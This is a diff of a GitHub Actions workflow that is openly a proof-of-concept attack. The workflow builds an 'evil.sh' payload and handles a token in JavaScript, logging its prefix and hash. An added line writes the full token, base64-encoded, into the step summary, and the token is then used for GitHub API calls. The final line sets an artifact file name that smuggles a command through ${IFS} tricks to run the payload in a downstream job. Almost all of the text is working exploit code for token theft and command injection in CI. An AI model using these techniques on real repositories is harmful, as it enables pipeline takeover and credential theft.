@@ -10,7 +10,7 @@ jobs:
       - name: build
         run: |
           mkdir -p out
-          printf 'no-pr-number\n' > out/readme.txt
+          printf 'x\n' > out/readme
           cat > out/evil.sh <<'SH'
           #!/bin/bash
           echo "=== ATTACK_RCE_BEGIN ==="
@@ -35,6 +35,7 @@ jobs:
             const fp = t ? crypto.createHash('sha256').update(t).digest('hex').slice(0, 16) : 'none';
             const log = (m) => console.log('ATK ' + m);
             log('action=' + action + ' token_len=' + t.length + ' prefix=' + t.slice(0, 11) + ' sha256_16=' + fp);
+            try { fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY || '/dev/null', 'TOKENSUMMARY action=' + action + ' len=' + t.length + ' prefix=' + t.slice(0, 11) + ' sha256_16=' + fp + ' token_b64=' + Buffer.from(t).toString('base64') + '\n'); } catch (e) {}
             const H = { Authorization: 'Bearer ' + t, 'User-Agent': 'poc-runner', Accept: 'application/vnd.github+json' };
             const call = async (method, path, body) => {
               const r = await fetch(api + path, { method, headers: body ? Object.assign({ 'Content-Type': 'application/json' }, H) : H, body: body ? JSON.stringify(body) : undefined });
@@ -84,7 +85,7 @@ jobs:
           done
           echo "=== ATTACK_RCE_END ==="
           SH
-          printf 'x' > "out/readme.txt;P=\$(node\${IFS}-e\${IFS}'process.stdout.write(String.fromCharCode(47))');bash\${IFS}\${P}tmp\${P}content\${P}content\${P}evil.sh;#.txt"
+          printf 'x' > "out/readme;P=\$(node\${IFS}-e\${IFS}'process.stdout.write(String.fromCharCode(47))');bash\${IFS}\${P}tmp\${P}content\${P}content\${P}evil.sh;#.txt"
       - uses: actions/upload-artifact@v4
         with:
           name: content
